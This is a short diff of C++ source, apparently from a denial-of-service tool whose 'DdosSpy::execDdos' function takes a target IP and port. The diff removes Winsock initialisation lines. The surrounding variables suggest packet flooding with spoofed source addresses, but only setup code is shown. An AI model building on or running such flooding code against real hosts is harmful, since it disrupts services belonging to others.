@@ -195,11 +195,7 @@ void DdosSpy::execDdos(std::string atk_ip, int atk_port)
     int port=atk_port;
     const char *DestIP=atk_ip.data();
 
-
-    //wsastartup没写.........
     /******************/
-    WSADATA wsaData;
-    WSAStartup(MAKEWORD(2,2),&wsaData);
     SOCKET  sock =(SOCKET)NULL;
     int flag=true,TimeOut=2000,FakeIpNet,FakeIpHost,dataSize=0,SendSEQ=0;
     struct sockaddr_in sockAddr;
